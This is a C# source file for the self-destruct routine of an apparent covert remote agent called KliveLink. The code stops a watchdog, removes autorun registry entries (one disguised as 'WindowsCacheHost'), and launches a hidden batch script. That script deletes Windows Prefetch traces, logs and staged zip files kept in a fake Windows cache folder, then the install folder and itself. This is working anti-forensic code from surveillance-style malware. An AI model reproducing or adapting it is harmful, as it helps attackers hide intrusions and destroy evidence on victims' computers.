using System.Diagnostics;
using Microsoft.Win32;
using KliveLink.Contracts;

namespace KliveLink.Agent.V2;

public static class V2SelfDestruct
{
    public static V2SelfDestructResult Run()
    {
        var result = new V2SelfDestructResult();
        try
        {
            string exe = Environment.ProcessPath ?? Process.GetCurrentProcess().MainModule?.FileName ?? "";
            string? installDir = Path.GetDirectoryName(exe);
            string? watchdogPid = V2CommandDispatcher.FindWatchdogPid();
            if (!string.IsNullOrWhiteSpace(watchdogPid))
            {
                try { Process.GetProcessById(int.Parse(watchdogPid)).Kill(entireProcessTree: true); result.WatchdogStopped = true; } catch { }
            }

            try
            {
                using RegistryKey? key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
                foreach (string valueName in new[] { "KL", "WindowsCacheHost" })
                {
                    if (key?.GetValue(valueName) != null)
                    {
                        key.DeleteValue(valueName, throwOnMissingValue: false);
                        result.RunKeyRemoved = true;
                    }
                }
            }
            catch { }

            string temp = Path.Combine(Path.GetTempPath(), $"kl_cleanup_{Guid.NewGuid():N}.cmd");
            string script =
                "@echo off\r\n" +
                "timeout /t 2 /nobreak >nul\r\n" +
                $"taskkill /F /PID {Environment.ProcessId} >nul 2>&1\r\n" +
                "timeout /t 2 /nobreak >nul\r\n" +
                "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v KL /f >nul 2>&1\r\n" +
                "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsCacheHost /f >nul 2>&1\r\n" +
                "del /f /q \"%SystemRoot%\\Prefetch\\*KLIVELINK*\" >nul 2>&1\r\n" +
                "del /f /q \"%SystemRoot%\\Prefetch\\*WINDOWSCACHEHOST*\" >nul 2>&1\r\n" +
                "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.log\" >nul 2>&1\r\n" +
                "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.log.1\" >nul 2>&1\r\n" +
                "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.dat\" >nul 2>&1\r\n" +
                "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.pending.zip\" >nul 2>&1\r\n" +
                "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.pending.json\" >nul 2>&1\r\n" +
                "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.auto.json\" >nul 2>&1\r\n" +
                "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.*.pending.zip\" >nul 2>&1\r\n" +
                "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.*.pending.json\" >nul 2>&1\r\n" +
                "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.*.auto.json\" >nul 2>&1\r\n" +
                "rmdir /s /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\kl\" >nul 2>&1\r\n" +
                (string.IsNullOrWhiteSpace(installDir) ? "" : $"rmdir /s /q \"{installDir}\" >nul 2>&1\r\n") +
                $"del /f /q \"{temp}\" >nul 2>&1\r\n";
            File.WriteAllText(temp, script);
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/d /c \"{temp}\"",
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
            });
            result.Acknowledged = true;
            result.Message = "Self-destruct initiated; watchdog stopped, Run key removed, cleanup scheduled.";
            result.Checks["watchdog"] = result.WatchdogStopped;
            result.Checks["runKey"] = result.RunKeyRemoved;
            result.Checks["prefetch"] = true;
            result.Checks["installTree"] = true;
            result.Checks["cleanupScript"] = File.Exists(temp);
        }
        catch (Exception ex)
        {
            result.Acknowledged = false;
            result.Message = ex.Message;
        }
        return result;
    }
}
